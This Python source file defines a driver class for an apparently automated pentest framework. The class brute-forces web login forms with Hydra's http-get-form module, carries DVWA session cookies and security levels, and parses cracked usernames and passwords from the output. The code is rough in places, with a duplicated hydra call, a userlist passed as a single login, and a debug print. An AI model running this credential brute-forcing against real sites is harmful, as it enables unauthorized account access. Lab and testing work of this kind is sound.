import os
import subprocess
from tenacity import retry, stop_after_attempt, wait_fixed

from modules.core.driver import BaseToolDriver, DriverResult, ParsedResult

class HydraHttpDriver(BaseToolDriver):
    """
    Brute‐force HTTP form logins using hydra's http-form module.
    Expects kwargs:
      - form: { action, method, fields }  (from FormDiscovery)
      - userlist: path to usernames file
      - passlist: path to passwords file
    """
    name = "hydra_http"

    
    def __init__(self, config, session_mgr, logger):
        super().__init__(config, session_mgr, logger)
        self.binary    = config["hydra_binary"]
        self.output_dir= config["hydra_output_dir"]
        os.makedirs(self.output_dir, exist_ok=True)

    def get_dvwa_cookies_and_level(self, target):
        """
        Try to retrieve the PHPSESSID and security level for DVWA.
        Returns: dict (cookies), str (security level) or (None, None)
        """
        session = self.session_mgr.get(target)
        cookies = {}
        security_level = "low"

        if session:
            cookies = session.cookies.get_dict()
            # Optionally, fetch the security level if needed
            try:
                resp = session.get(f"{target}/security.php", timeout=5)
                if "security level" in resp.text.lower():
                    import re
                    m = re.search(r'value="([a-z]+)" selected', resp.text)
                    if m:
                        security_level = m.group(1)
            except Exception as e:
                self.logger.info(f"[hydra_http] Could not determine DVWA security level: {e}")
        return cookies, security_level


    @retry(stop=stop_after_attempt(3), wait=wait_fixed(5), reraise=True)
    def run(self, target: str, form: dict, userlist: str, passlist: str, **kwargs):
        session = kwargs.get("session") or self.session_mgr.get(target)
        if not session:
            self.logger.warning(f"[hydra_http] No session found for {target}, skipping cookie brute.")
            return None
        cookies = session.cookies.get_dict()
        phpsessid = cookies.get("PHPSESSID")
        security_level = cookies.get("security", "low")
        cookie_hdr = f"H=Cookie: PHPSESSID={phpsessid}; security={security_level}"
        hydra_args = [
            "hydra",
            "-l", userlist,   # or "-L", userlist, if you want to brute a list
            "-P", passlist,
            target,
            "http-get-form",
            f"{form['action']}:"
            f"{form['username_field']}=^USER^&{form['password_field']}=^PASS^&Login=Login:"
            f"{form.get('fail_string', 'Login failed.')}:{cookie_hdr}"
        ]
        proc = subprocess.run(hydra_args, capture_output=True, text=True)
        output = proc.stdout + "\n" + proc.stderr
        # Use output in your result handling
        drv_result = DriverResult(output)

        
        # DEBUG: Show all cookies for troubleshooting
        self.logger.info(f"[hydra_http] Cookies for {target}: {cookies}")

        if phpsessid:
            self.logger.info(f"[hydra_http] PHPSESSID found for {target}, running cookie brute.")
            return self._run_cookie_brute(
                target, form, userlist, passlist, phpsessid, security_level
            )
        else:
            self.logger.warning(f"[hydra_http] No PHPSESSID in cookies for {target}. Not running _run_cookie_brute.")
            return None










    def _run_cookie_brute(self, target, form, userlist, passlist, phpsessid, security_level):
        """
        Launches Hydra with the required cookies in the HTTP header.
        """
        # Compose cookie header
        cookie_hdr = f"H=Cookie: PHPSESSID={phpsessid}; security={security_level}"
        # Example: fill in login form parameters and action as needed
        form_action = form.get("action", "/DVWA/login.php")
        user_field = form.get("username_field", "username")
        pass_field = form.get("password_field", "password")
        fail_str = form.get("fail_string", "Login failed.")
        print("I'm ALIVE")
        hydra_args = [
            "hydra",
            "-l", userlist,
            "-P", passlist,
            target,
            "http-get-form",
            f"{form_action}:{user_field}=^USER^&{pass_field}=^PASS^&Login=Login:{fail_str}:{cookie_hdr}"
        ]

        self.logger.info(f"[hydra_http] Running Hydra with cookies for {target}: {' '.join(hydra_args)}")
        result = subprocess.run(hydra_args, capture_output=True, text=True)
        # Optionally, parse results here...
        return result
        
    def parse(self, raw_output_path: str) -> ParsedResult:
        """
        Parse hydra's output file lines like:
           [80][http-form-post] host:port login: admin   password: password123
        """
        creds = []
        with open(raw_output_path) as f:
            for line in f:
                if "login:" in line and "password:" in line:
                    parts = line.strip().split()
                    user = parts[parts.index("login:")+1]
                    pw   = parts[parts.index("password:")+1]
                    creds.append({"username": user, "password": pw})
        return ParsedResult(data={"credentials": creds})
